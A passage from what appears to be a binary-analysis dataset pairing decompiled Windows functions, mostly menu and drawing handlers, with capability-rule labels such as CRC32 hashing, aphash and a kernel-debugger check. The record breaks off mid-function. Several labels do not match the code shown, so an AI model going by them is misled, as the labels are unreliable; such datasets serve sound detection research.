pcVar1 = swi(3);\n                uVar4 = (*pcVar1)();\n                return uVar4;\n            }\n            iVar3 = *(*(in_ECX + 8) + iVar2 * 4);\n            if (iVar3 != 0) {\n                (*pcVar1)(iVar3, 0x100, 0x1b, 0);\n            }\n        }\n    }\n    if (*(in_ECX + 0x8c) == -2) {\n        *(in_ECX + 0x8c) = 0xffffffff;\n        fcn.00403fe0();\n    }\n    *arg_14h = 1;\n    return 0;\n}\n",
        "token_count": 1575
    },
    "00408110": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpmii\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00408110(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint *arg_14h)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uint *puVar7;\n    uint uVar8;\n    int32_t in_ECX;\n    int32_t iVar9;\n    uint uVar10;\n    uint lpmii;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint32_t var_f8h;\n    uint var_f0h;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    int32_t item;\n    uint hmenu;\n    uint lpString;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    hmenu = arg_ch;\n    if ((arg_10h >> 0x10 != 0) || (uVar1 = *(in_ECX + 0x84),  (uVar1 & 3) == 0)) {\n        *arg_14h = 0;\n        fcn.004303e9(lpmii);\n        return;\n    }\n    if ((uVar1 & 2) == 0) {\n        if ((arg_10h == 0) && ((uVar1 & 0x10) == 0)) {\n            arg_10h = (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x447, 0, 0);\n        }\n        uVar8 = *(in_ECX + 0x5c);\n        uVar10 = *(in_ECX + 0x74);\n    }\n    else {\n        if ((arg_10h == 0) && ((uVar1 & 0x10) == 0)) {\n            arg_10h = (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x447, 0, 0);\n        }\n        uVar8 = *(in_ECX + 4);\n        uVar10 = *(in_ECX + 0x40);\n    }\n    var_d8h = (*_sym.imp.USER32.dll_CallWindowProcW)(uVar10, uVar8, arg_8h, arg_ch, arg_10h);\n    if ((*(in_ECX + 0x86) & 1) == 0) {\n        if ((*(in_ECX + 0x84) & 4) != 0) {\n            fcn.00431db0(&lpString, 0, 200);\n            iVar5 = 0;\n            item = 0;\n            iVar9 = (*_sym.imp.USER32.dll_GetMenuItemCount)(arg_ch);\n            if (0 < iVar9) {\n                do {\n                    _var_e8h = ZEXT48(&lpString) << 0x20;\n                    _var_100h = 0;\n                    _var_f8h = 0;\n                    _var_f0h = 0;\n                    lpmii = 0x30;\n                    _var_e0h = 100;\n                    var_104h = 0x3f;\n                    iVar9 = iVar5;\n                    (*_sym.imp.USER32.dll_GetMenuItemInfoW)(arg_ch, iVar5, 1, &lpmii);\n                    if ((_var_100h & 0x100) == 0) {\n                        var_104h = 0x31;\n                        puVar7 = fcn.0042faca(0x14, iVar9);\n                        arg_ch = hmenu;\n                        if (puVar7 != NULL) {\n                            puVar7[2] = 0;\n                            puVar7[3] = 0;\n                            *puVar7 = 0x1313;\n                            puVar7[1] = 0;\n                            puVar7[4] = 0;\n                            puVar7[2] = var_100h;\n                            puVar7[3] = var_fch;\n                            iVar9 = 0;\n                            _var_100h = _var_100h | 0x100;\n                            puVar7[4] = 0xffffffff;\n                            iVar5 = *(in_ECX + 0x50);\n                            if (0 < iVar5) {\n                                do {\n                                    if ((iVar9 < 0) || (iVar5 <= iVar9)) goto code_r0x004084d5;\n                                    if (*(*(in_ECX + 0x4c) + iVar9 * 2) == var_f8h) {\n                                        puVar7[4] = iVar9;\n                                        break;\n                                    }\n                                    iVar9 = iVar9 + 1;\n                                } while (iVar9 < iVar5);\n                            }\n                            iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpString);\n                            puVar7[1] = 0;\n                            iVar3 = (iVar5 + 1U) * 2;\n                            iVar9 = fcn.0042fb08(-(iVar3 >> 0x20 != 0) | iVar3);\n                            puVar7[1] = iVar9;\n                            if (iVar9 != 0) {\n                                uVar8 = fcn.0043be56(iVar9, iVar5 + 1U, &lpString);\n                                fcn.00402c90(uVar8);\n                            }\n                            arg_ch = hmenu;\n                            iVar5 = item;\n                            _var_e8h = _var_e8h & 0xffffffff00000000 | ZEXT48(puVar7);\n                            (*_sym.imp.USER32.dll_SetMenuItemInfoW)(hmenu, item, 1, &lpmii);\n                        }\n                    }\n                    iVar5 = iVar5 + 1;\n                    item = iVar5;\n                    iVar9 = (*_sym.imp.USER32.dll_GetMenuItemCount)(arg_ch);\n                } while (iVar5 < iVar9);\n            }\n            fcn.0040bee0(arg_ch);\n        }\n    }\n    else {\n        iVar9 = 0;\n        iVar5 = (*_sym.imp.USER32.dll_GetMenuItemCount)(arg_ch);\n        if (0 < iVar5) {\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMenuItemID)(arg_ch, iVar9);\n                arg_ch = hmenu;\n                iVar5 = 0;\n                if (0 < *(in_ECX + 0x50)) {\n                    piVar6 = *(in_ECX + 0x4c);\n                    do {\n                        if (*piVar6 == iVar4) goto code_r0x004081f7;\n                        iVar5 = iVar5 + 1;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar5 < *(in_ECX + 0x50));\n                }\n                iVar5 = -1;\ncode_r0x004081f7:\n                _var_100h = 0;\n                _var_f8h = 0;\n                _var_f0h = 0;\n                _var_e8h = 0;\n                _var_e0h = 0;\n                lpmii = 0x30;\n                var_104h = 0x80;\n                if (((*(in_ECX + 0x84) & 4) != 0) && (iVar5 != -1)) {\n                    if ((iVar5 < 0) || (*(in_ECX + 0xb8) <= iVar5)) {\ncode_r0x004084d5:\n                        fcn.00402f30(0x8000000b);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    _var_e0h = *(*(in_ECX + 0xb4) + iVar5 * 4) << 0x20;\n                }\n                (*_sym.imp.USER32.dll_SetMenuItemInfoW)(hmenu, iVar9, 1, &lpmii);\n                iVar9 = iVar9 + 1;\n                iVar5 = (*_sym.imp.USER32.dll_GetMenuItemCount)(arg_ch);\n                if (iVar5 <= iVar9) {\n                    fcn.004303e9(arg_8h);\n                    return;\n                }\n            } while( true );\n        }\n    }\n    fcn.004303e9(arg_8h);\n    return;\n}\n",
        "token_count": 1885
    },
    "004084e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004084e0(uint noname_0, int32_t arg_ch, uint noname_2, uint *arg_14h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint var_60h;\n    uint var_5ch;\n    uint32_t var_58h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    if ((arg_ch != 0) && (puVar5 = *(in_ECX + 0x10),  puVar5 != NULL)) {\n        puVar6 = *(in_ECX + 0xc);\n        uVar1 = *puVar6;\n        while (uVar1 != 0xffff) {\n            if ((*(puVar6 + 1) & 1) != 0) {\n                uVar1 = *puVar5;\n                uVar4 = *puVar6;\n                if ((uVar1 & 0x4000) != 0) {\n                    (*_sym.imp.USER32.dll_SetMenuDefaultItem)(arg_ch, 0xffffffff, 0);\n                    *puVar5 = *puVar5 & 0xbfff;\n                    uVar1 = *puVar5;\n                }\n                var_4h = 0;\n                _var_28h = 0;\n                var_24h = 0;\n                _var_1ch = 0;\n                _var_14h = 0;\n                _var_ch = 0;\n                var_30h = 0x30;\n                var_2ch = 1;\n                if ((uVar1 & 0x100) != 0) {\n                    var_24h = 3;\n                    _var_28h = 0x300000000;\n                }\n                uVar2 = var_24h;\n                if ((uVar1 & 0x200) != 0) {\n                    uVar2 = var_24h | 8;\n                    _var_28h = var_24h << 0x20 | 0x800000000;\n                }\n                if ((uVar1 & 0x1000) != 0) {\n                    _var_28h = uVar2 << 0x20 | 0x100000000000;\n                }\n                var_20h = uVar4;\n                if ((uVar1 & 0x2000) != 0) {\n                    _var_58h = 0;\n                    _var_4ch = 0;\n                    _var_44h = 0;\n                    _var_3ch = 0;\n                    var_34h = 0;\n                    var_60h = 0x30;\n                    var_5ch = 0x10;\n                    var_50h = uVar4;\n                    iVar3 = (*_sym.imp.USER32.dll_GetMenuItemInfoW)(arg_ch, uVar4, 0, &var_60h);\n                    if (iVar3 != 0) {\n                        var_2ch = var_2ch | 0x10;\n                        _var_28h = _var_28h & 0xffffffff00000000 | var_28h | var_58h & 0xfffff7fb;\n                        _var_ch = _var_ch & 0xffffffff00000000 | *(puVar5 + 2);\n                    }\n                }\n                (*_sym.imp.USER32.dll_SetMenuItemInfoW)(arg_ch, uVar4, 0, &var_30h);\n                if ((*puVar5 & 0x800) != 0) {\n                    (*_sym.imp.USER32.dll_CheckMenuRadioItem)(arg_ch, puVar5[2], puVar5[3], *puVar6, 0);\n                }\n            }\n            puVar6 = puVar6 + 2;\n            puVar5 = puVar5 + 4;\n            uVar1 = *puVar6;\n        }\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 1017
    },
    "00408880": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpmii\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00408880(uint noname_0, uint32_t arg_ch, uint hmenu, uint *arg_14h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    char cVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    int32_t iVar8;\n    uint8_t uVar9;\n    int32_t in_ECX;\n    uint32_t uVar10;\n    uint lpmii;\n    uint var_150h;\n    uint var_14ch;\n    uint var_144h;\n    uint var_13ch;\n    int32_t *var_134h;\n    uint *var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint32_t var_124h;\n    uint *var_120h;\n    uint var_11ch;\n    int32_t var_118h;\n    uint32_t var_114h;\n    uint32_t var_110h;\n    char var_109h;\n    uint var_108h;\n    int32_t var_100h;\n    uint var_f8h;\n    int32_t var_f0h;\n    int32_t lpBuffer;\n    uint uStack232;\n    uint var_e0h;\n    uint32_t var_d8h;\n    uint32_t var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_120h = arg_14h;\n    *arg_14h = 1;\n    pcVar2 = _sym.imp.USER32.dll_SendMessageW;\n    uVar10 = arg_ch & 0xffff;\n    uVar9 = *(in_ECX + 0x84) & 1;\n    var_124h = uVar10;\n    if ((uVar9 == 0) || (uVar10 == 0xd)) {\n        var_11ch = 0x10001;\n        if (uVar9 == 0) {\n            var_110h = 0;\n            iVar6 = (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x45a, uVar10, &var_110h);\n            puVar4 = var_120h;\n            if (iVar6 == 0) {\n                *var_120h = 0;\n                (*_sym.imp.USER32.dll_PostMessageW)(*(in_ECX + 4), 0x448, 0xffffffff);\n                fcn.004064e0();\n                if ((uVar10 == 0x2f) && (cVar5 = fcn.00403fe0(),  cVar5 != '\\0')) {\n                    *puVar4 = 1;\n                }\n            }\n            else {\n                iVar6 = *(in_ECX + 0x5c);\n                iVar8 = (*_sym.imp.USER32.dll_IsWindowEnabled)();\n                if (iVar8 != 0) {\n                    _var_108h = ZEXT816(0);\n                    (*_sym.imp.USER32.dll_GetClientRect)(*(in_ECX + 4), &var_108h);\n                    _var_f8h = ZEXT816(0);\n                    (*pcVar2)(*(in_ECX + 4), 0x41d, var_110h, &var_f8h);\n                    var_d0h = 0;\n                    _var_e0h = 0;\n                    var_d8h = 0;\n                    var_d4h = 0;\n                    (*pcVar2)(*(in_ECX + 4), 0x417, var_110h, &var_e0h);\n                    if (((var_d8h & 4) != 0) && ((var_d8h & 8) == 0)) {\n                        if (var_f0h <= var_100h) {\n                            if ((*(in_ECX + 0x85) & 6) == 2) {\n                                *(in_ECX + 0x85) = *(in_ECX + 0x85) | 8;\n                                fcn.0040d5b0(1);\n                            }\n                            fcn.0040d960();\n                            (*_sym.imp.USER32.dll_PostMessageW)(*(in_ECX + 4), 0x100, 0x28, 0);\n                            (*pcVar2)(*(in_ECX + 4), 0x448, var_110h, 0);\n                            goto code_r0x00408c9b;\n                        }\n                    }\n                    (*_sym.imp.USER32.dll_MessageBeep)(0);\n                }\n            }\ncode_r0x00408c9b:\n            fcn.004303e9(iVar6);\n            return;\n        }\n    }\n    else {\n        var_11ch = 0;\n    }\n    if (arg_ch >> 0x10 == 0x10) {\n        var_118h = (*_sym.imp.USER32.dll_GetMenuItemCount)(hmenu);\n        fcn.00431db0(&var_cch, 0, 200);\n        var_110h = 0;\n        var_109h = '\\0';\n        var_114h = 0;\n        if (0 < var_118h) {\n            do {\n                uVar10 = var_114h;\n                var_130h = &var_cch;\n                var_134h = NULL;\n                _var_14ch = 0;\n                _var_144h = 0;\n                _var_13ch = 0;\n                var_128h = 0;\n                lpmii = 0x30;\n                var_12ch = 100;\n                var_150h = 0x3f;\n                iVar6 = (*_sym.imp.USER32.dll_GetMenuItemInfoW)(hmenu, var_114h, 1, &lpmii);\n                piVar3 = var_134h;\n                if (((iVar6 != 0) && ((_var_14ch & 0x800) == 0)) && (var_134h != NULL)) {\n                    var_d0h = 0;\n                    lpBuffer = 0;\n                    uStack232 = 0;\n                    _var_e0h = 0;\n                    var_d8h = 0;\n                    var_d4h = 0;\n                    (*_sym.imp.KERNEL32.dll_VirtualQuery)(var_134h, &lpBuffer, 0x1c);\n                    if (((lpBuffer != 0) && ((var_d4h & 6) != 0)) &&\n                       ((*piVar3 == 0x1313 && (piVar7 = piVar3[1],  piVar7 != NULL)))) {\n                        iVar1 = *piVar7;\n                        while ((iVar1 != 0 && (iVar1 != 0x26))) {\n                            piVar7 = (*_sym.imp.USER32.dll_CharNextW)(piVar7);\n                            iVar1 = *piVar7;\n                        }\n                        if (*piVar7 != 0) {\n                            iVar1 = piVar7[1];\n                            iVar6 = (*_sym.imp.USER32.dll_CharLowerW)(var_124h & 0xffff);\n                            iVar8 = (*_sym.imp.USER32.dll_CharLowerW)(iVar1);\n                            uVar10 = var_114h;\n                            if (iVar8 == iVar6) {\n                                if (var_109h != '\\0') goto code_r0x00408ae5;\n                                var_110h = var_114h & 0xffff;\n                                var_109h = '\\x01';\n                            }\n                        }\n                    }\n                }\n                var_114h = uVar10 + 1;\n            } while (var_114h < var_118h);\n            if (var_109h == '\\0') {\n                fcn.004303e9(lpmii);\n                return;\n            }\n            (*_sym.imp.USER32.dll_PostMessageW)(*(in_ECX + 4), 0x448, 0xffffffff, 0);\n            fcn.004064e0();\ncode_r0x00408ae5:\n            *var_120h = 1;\n            fcn.004303e9(lpmii);\n            return;\n        }\n    }\n    fcn.004303e9(lpmii);\n    return;\n}\n",
        "token_count": 1864
    },
    "00409300": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lParam\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409300(uint noname_0, int32_t *arg_ch, uint *arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint lParam;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b4h;\n    uint *var_1ach;\n    uint var_1a8h;\n    uint *var_1a4h;\n    int32_t var_1a0h;\n    int32_t hgdiobj;\n    uint lpchText;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_1a4h = arg_10h;\n    *arg_10h = 0;\n    pcVar1 = _sym.imp.USER32.dll_GetSysColorBrush;\n    if (*arg_ch != *(in_ECX + 4)) {\ncode_r0x0040950a:\n        fcn.004303e9(lParam);\n        return;\n    }\n    if (arg_ch[3] == 1) {\n        *arg_10h = 1;\n        fcn.004303e9(lParam);\n        return;\n    }\n    if (arg_ch[3] != 0x10001) goto code_r0x0040950a;\n    if ((*(in_ECX + 0x85) & 1) == 0) {\n        if (-1 < *(in_ECX + 0x84)) {\n            iVar3 = (*_sym.imp.USER32.dll_GetSysColor)(0x11);\n            arg_ch[0xf] = iVar3;\n            *arg_10h = 1;\n        }\n        goto code_r0x0040950a;\n    }\n    hgdiobj = in_ECX;\n    if ((arg_ch[10] >> 2 & 1) == 0) {\n        if ((arg_ch[10] & 0x41U) == 0) {\n            if (*(in_ECX + 0x84) < '\\0') goto code_r0x004093da;\n            goto code_r0x004093cf;\n        }\n        uVar2 = (*_sym.imp.USER32.dll_GetSysColorBrush)(0x1d);\n        (*_sym.imp.USER32.dll_FillRect)(arg_ch[4], arg_ch + 5, uVar2);\n        uVar2 = (*pcVar1)(0xd);\n        (*_sym.imp.USER32.dll_FrameRect)(arg_ch[4], arg_ch + 5, uVar2);\n        iVar3 = (*(hgdiobj + 0x84) >> 7 & 0xfffffffdU) + 0x11;\n    }\n    else {\ncode_r0x004093cf:\n        iVar3 = 0x11;\n    }\n    iVar3 = (*_sym.imp.USER32.dll_GetSysColor)(iVar3);\n    arg_ch[0xf] = iVar3;\n    in_ECX = hgdiobj;\ncode_r0x004093da:\n    iVar3 = arg_ch[4];\n    (*_sym.imp.GDI32.dll_SetTextColor)(iVar3, arg_ch[0xf]);\n    (*_sym.imp.GDI32.dll_SetBkMode)(iVar3, arg_ch[0x19]);\n    var_1a0h = (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x31, 0, 0);\n    hgdiobj = 0;\n    if (var_1a0h != 0) {\n        hgdiobj = (*_sym.imp.GDI32.dll_SelectObject)(iVar3, var_1a0h);\n    }\n    fcn.00431db0(&lpchText, 0, 400);\n    lParam = 0x20;\n    var_1ach = &lpchText;\n    var_1c0h = 2;\n    _var_1bch = 0;\n    _var_1b4h = 0;\n    var_1a8h = 200;\n    (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x43f, arg_ch[9], &lParam);\n    arg_ch = arg_ch + 5;\n    (*_sym.imp.USER32.dll_DrawTextW)\n              (iVar3, &lpchText, 0xffffffff, arg_ch, ~(*(in_ECX + 0x85) << 0x12) & 0x100000 | 0x25);\n    if (var_1a0h != 0) {\n        (*_sym.imp.GDI32.dll_SelectObject)(iVar3, hgdiobj);\n    }\n    *var_1a4h = 1;\n    fcn.004303e9(arg_ch);\n    return;\n}\n",
        "token_count": 1091
    },
    "004099e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004099e0(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint arg_8h_00;\n    uint arg_8h_01;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_410h;\n    uint *var_408h;\n    uint var_404h;\n    uint lpmii;\n    uint var_3fch;\n    uint var_3f8h;\n    uint var_3f0h;\n    uint var_3ech;\n    uint var_3e8h;\n    uint var_3e0h;\n    uint *var_3dch;\n    uint var_3d8h;\n    uint var_3d4h;\n    int32_t var_3d0h;\n    int32_t hmenu;\n    int32_t *var_3c8h;\n    uint *var_3c4h;\n    uint8_t var_3bdh;\n    uint var_3bch;\n    uint var_3b8h;\n    uint var_39ch;\n    uint lpRect;\n    int32_t var_350h;\n    int32_t var_34ch;\n    uint var_348h;\n    int32_t var_340h;\n    int32_t var_33ch;\n    uint lParam;\n    uint wParam;\n    uint var_330h;\n    uint var_328h;\n    uint var_324h;\n    uint lpBuffer;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_3c8h = arg_8h;\n    var_3bch = 100;\n    cVar2 = fcn.004066f0(6, 0, 0);\n    if ((cVar2 == '\\0') || (cVar2 = fcn.004065c0(),  cVar2 == '\\0')) {\n        var_3bch = 0x50;\n    }\n    fcn.00431db0(&var_3b8h, 0, 0x60);\n    pcVar1 = _sym.imp.USER32.dll_SendMessageW;\n    var_3b8h = 0x10;\n    (*_sym.imp.USER32.dll_SendMessageW)(*arg_8h[1], 0x41c, arg_8h[1][3], &var_3bch);\n    arg_8h_01 = 0;\n    var_3d0h = (*pcVar1)(var_39ch, 0x418, 0);\n    if (0 < var_3d0h) {\n        arg_8h_00 = var_39ch;\n        hmenu = (*pcVar1)(var_39ch, 0x52e, 0, 0);\n        *(var_3c8h + 2) = hmenu != 0;\n        iVar3 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        _lpRect = ZEXT816(0);\n        (*_sym.imp.USER32.dll_GetClientRect)(var_39ch, &lpRect);\n        iVar7 = 0;\n        do {\n            var_328h = 0;\n            _lParam = ZEXT816(0);\n            (*_sym.imp.USER32.dll_SendMessageW)(var_39ch, 0x417, iVar7, &lParam);\n            if ((_lParam & 0x8) == 0x0) {\n                _var_348h = ZEXT816(0);\n                (*_sym.imp.USER32.dll_SendMessageW)(var_39ch, 0x41d, iVar7, &var_348h);\n                var_3bdh = var_330h >> 2 & 1;\n                if (var_340h <= var_350h) {\n                    if (var_33ch <= var_34ch) goto code_r0x00409d23;\n                }\n                if ((_lParam & 0x100) == 0x0) {\n                    if (*(var_3c8h + 2) == '\\0') {\n                        fcn.00431db0(&lpBuffer, 0, 400);\n                        var_420h = 0x20;\n                        var_408h = &lpBuffer;\n                        var_41ch = 2;\n                        _var_418h = 0;\n                        _var_410h = 0;\n                        var_404h = 200;\n                        var_3c4h = var_408h;\n                        iVar4 = (*_sym.imp.USER32.dll_SendMessageW)(var_39ch, 0x43f, wParam, &var_420h);\n                        if ((iVar4 == -1) || (puVar5 = var_3c4h,  lpBuffer == 0)) {\n                            var_3c4h = 0x47bc40;\n                            iVar4 = (*_sym.imp.USER32.dll_LoadStringW)(*0x6cc7e4, wParam, &lpBuffer, 200);\n                            iVar6 = 0;\n                            if (iVar4 < 1) {\n                                puVar5 = 0x47bc40;\n                            }\n                            else {\n                                do {\n                                    if (*(&lpBuffer + iVar6 * 2) == 10) {\n                                        puVar5 = &lpBuffer + iVar6 * 2 + 2;\n                                        break;\n                                    }\n                                    iVar6 = iVar6 + 1;\n                                    puVar5 = var_3c4h;\n                                } while (iVar6 < iVar4);\n                            }\n                        }\n                        uVar8 = var_3bdh ^ 1;\n                        var_3ech = wParam;\n                    }\n                    else {\n                        fcn.00431db0(&var_324h, 0, 400);\n                        var_3e0h = 0;\n                        var_3dch = &var_324h;\n                        var_3d4h = 0;\n                        _var_3f8h = 0;\n                        _var_3f0h = 0;\n                        _var_3e8h = 0;\n                        lpmii = 0x30;\n                        var_3fch = 0x14;\n                        var_3d8h = 200;\n                        (*_sym.imp.USER32.dll_GetMenuItemInfoW)(hmenu, iVar7, 1, &lpmii);\n                        uVar8 = var_3bdh ^ 1 | 0x10;\n                        puVar5 = var_3dch;\n                    }\n                }\n                else {\n                    iVar4 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar3);\n                    if (iVar4 < 1) goto code_r0x00409d23;\n                    var_3ech = 0;\n                    uVar8 = 0x800;\n                    puVar5 = NULL;\n                }\n                (*_sym.imp.USER32.dll_AppendMenuW)(iVar3, uVar8, var_3ech, puVar5);\n            }\ncode_r0x00409d23:\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < var_3d0h);\n        iVar7 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar3);\n        if (iVar7 != 0) {\n            *var_3c8h = iVar3;\n            fcn.004303e9(arg_8h_00);\n            return;\n        }\n        if (iVar3 != 0) {\n            (*_sym.imp.USER32.dll_DestroyMenu)(iVar3);\n        }\n        (*_sym.imp.USER32.dll_MessageBeep)(0xffffffff);\n    }\n    fcn.004303e9(arg_8h_01);\n    return;\n}\n",
        "token_count": 1750
    },
    "0040b340": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_208h\n\nvoid __cdecl\nfcn.0040b340(uint noname_0, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint *arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    uint var_208h;\n    uint lpBuffer;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    if (arg_1ch == 0) {\n        if (arg_ch == 0x14) {\n            if (*(in_ECX + 0x2c) != 0) {\n                *arg_18h = 1;\n                fcn.004303e9(arg_18h);\n                return;\n            }\n            *arg_18h = 0;\n        }\n        else {\n            if (arg_ch == 0x11f) {\n                if (*(in_ECX + 0x28) != 0) {\n                    if ((arg_10h >> 0x10 == -1) && (arg_14h == 0)) {\n                        (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 0x28), 0x409, 0, 0);\n                        *arg_18h = 1;\n                    }\n                    else {\n                        fcn.00431db0(&lpBuffer, 0, 0x200);\n                        if ((arg_10h >> 0x10 & 0x10) == 0) {\n                            arg_10h = arg_10h & 0xffff;\n                            iVar2 = arg_10h;\n                            if (iVar2 + 0x1000U < 0x1f0) {\n                                arg_10h = (arg_10h - 0xf000 >> 4) - 0x1100U & 0xffff;\n                            }\n                            else if (iVar2 + 0x1ef0U < 0x10) {\n                                arg_10h = 0xefda;\n                            }\n                            else if (iVar2 + 0x100U < 0xfe) {\n                                arg_10h = 0xef1f;\n                            }\n                            iVar3 = (*_sym.imp.USER32.dll_LoadStringW)(*0x6cc7e4, arg_10h, &lpBuffer, 0x100);\n                            iVar6 = 0;\n                            if (0 < iVar3) {\n                                do {\n                                    uVar4 = iVar6 * 2;\n                                    if (*(&lpBuffer + uVar4) == 10) {\n                                        if (0x1ff < uVar4) {\n                                            fcn.0042ffcf();\n                                            pcVar1 = swi(3);\n                                            (*pcVar1)();\n                                            return;\n                                        }\n                                        *(&lpBuffer + uVar4) = 0;\n                                        break;\n                                    }\n                                    iVar6 = iVar6 + 1;\n                                } while (iVar6 < iVar3);\n                            }\n                        }\n                        pcVar1 = _sym.imp.USER32.dll_SendMessageW;\n                        (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 0x28), 0x409, 1, 0);\n                        (*pcVar1)(*(in_ECX + 0x28), 0x40b, 0x1ff, &lpBuffer);\n                        *arg_18h = 1;\n                    }\n                    goto code_r0x0040b37e;\n                }\n            }\n            else if (arg_ch == 7) {\n                if (*(in_ECX + 0x2c) != 0) {\n                    (*_sym.imp.USER32.dll_SetFocus)(*(in_ECX + 0x2c));\n                    *arg_18h = 1;\n                    goto code_r0x0040b37e;\n                }\n            }\n            else {\n                if (arg_ch != 2) {\n                    if (arg_ch == 0x4e) {\n                        if (*(arg_14h + 8) == -0x208) {\n                            if ((arg_10h != 0) && ((*(arg_14h + 100) & 1) == 0)) {\n                                fcn.00431db0(&var_104h, 0, 0x100);\n                                iVar3 = (*_sym.imp.USER32.dll_LoadStringA)(*0x6cc7e4, arg_10h, &var_104h, 0x100);\n                                iVar6 = 0;\n                                if (0 < iVar3) {\n                                    do {\n                                        if (*(&var_104h + iVar6) == '\\n') {\n                                            uVar5 = fcn.0043c04a(arg_14h + 0x10, 0x50, &var_104h + iVar6 + 1, 0xffffffff\n                                                                );\n                                            fcn.00402c90(uVar5);\n                                            *(arg_14h + 100) = *(arg_14h + 100) | 0x8000;\n                                            *arg_18h = 0;\n                                            fcn.004303e9(arg_18h);\n                                            return;\n                                        }\n                                        iVar6 = iVar6 + 1;\n                                    } while (iVar6 < iVar3);\n                                    *(arg_14h + 100) = *(arg_14h + 100) | 0x8000;\n                                    *arg_18h = 0;\n                                    fcn.004303e9(arg_18h);\n                                    return;\n                                }\n                            }\n                        }\n                        else {\n                            if (*(arg_14h + 8) != -0x212) goto code_r0x0040b37e;\n                            if ((arg_10h != 0) && ((*(arg_14h + 0xb4) & 1) == 0)) {\n                                fcn.00431db0(&lpBuffer, 0, 0x200);\n                                iVar3 = (*_sym.imp.USER32.dll_LoadStringW)(*0x6cc7e4, arg_10h, &lpBuffer, 0x100);\n                                iVar6 = 0;\n                                if (0 < iVar3) {\n                                    do {\n                                        if (*(&lpBuffer + iVar6 * 2) == 10) {\n                                            uVar5 = fcn.0043bf88(arg_14h + 0x10, 0x50, &lpBuffer + iVar6 * 2 + 2, \n                                                                 0xffffffff);\n                                            fcn.00402c90(uVar5);\n                                            break;\n                                        }\n                                        iVar6 = iVar6 + 1;\n                                    } while 